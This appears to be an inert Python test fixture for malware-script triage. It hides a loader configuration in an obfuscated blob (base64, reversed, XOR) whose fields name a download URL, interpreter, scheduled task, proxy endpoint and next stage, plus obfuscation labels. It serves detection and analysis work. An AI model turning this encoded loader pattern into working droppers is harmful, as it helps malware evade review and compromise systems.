#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_f3a6dd92 = "qtGk1KGroKrQpdCl0dfRq7_LwsHCr_b7zfT0_fb88_ru5vPwvPrx5vPi4fv2v_7z8f3-r_f18-bhzebq9_zupqqipKOoo7yivKK8paCjr-b8-_3i9vz3zevq_eDi7qrz8auroKaipvC_9-bz9uLH__fm4evBr_f_8_zN-eHz5u736ve8_P365uvivarz8auroKaipvC__P365uvCvfPm89b_8-D1_eDCvajRr_rm8-LN4Pfm9-Di4Pfm_Pvu6-K8qvPxq6ugpqKm8L_35vP24ue8vfDz3uHh9-Dm_OfavfPm89b_8-D1_eDCvajRr_rm8-LN9_779O6q8_Grq6Cmoqbwvfz9-ubrwuHh9-Dm_Ofar-b89_XzzeD34efu6-K89_Oh9Kv08Pe99vv-8-T8-7z3_uL_8-r3vKrz8auroKaipvC9vajh4ubm-q_-4OfuqvPxq6ugpqKm8L_89fvz4v_z8a_2-8389fvz4v_z8e78_frm6-LN_ebN_v73-uHg9-X94q_8-_P68c3h5f32_Pvl7uD3_v7z5uH8--vizeD9_-Dz6-Kv4Pf74ODz8e788_7izff_8_zN9-T75vH3_vT34K_8_fvm8_Hh5_Tw_e768ebz4uH79s3r4PP8_fvm8fv2r-rz5vzr4e6nr-b85_3xzff18-bh7vT0_fb88_rN4Pf28_3-zfz9-ubr4vGv4Pfm4vP28-7h4ffx_eDizfrx5vPi4fv2vvf--_TN9-b74OW-9vf29vfw__fN9_b98ff2vvfm_f_34M334Pvn4_Hzvubh_frN9_779P3g4q_h4vfm4e6gr-Q="

CODEC_f3a6dd92 = "urlsafe_base64|reverse_then_xor|92"



def load_f3a6dd92():

    return base64.urlsafe_b64decode(MATERIAL_f3a6dd92)



def decode_f3a6dd92(EnCoDeD_Bytes):

    return bytes(value ^ 146 for value in reversed(EnCoDeD_Bytes))



def recover_f3a6dd92():

    NeUtRaL = ":".join(("north", "south"))

    DeCoDeD_Bytes = decode_f3a6dd92(load_f3a6dd92())

    DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")

    return DeScRiPtOr_Text



def inspect_f3a6dd92():

    return recover_f3a6dd92()



def surface_f3a6dd92():

    routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}

    return routes["selected"]()



def obfuscation_f3a6dd92():

    reflection_plan = ("__import__", "getattr", "reflective_name_plan")

    return reflection_plan[-1]



def plan_f3a6dd92():

    fields = dict(item.split("=", 1) for item in inspect_f3a6dd92().split("|"))

    analysis_surface = surface_f3a6dd92()

    obfuscation_surface = obfuscation_f3a6dd92()

    operation_plan = ("cpython_loader_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_f3a6dd92())

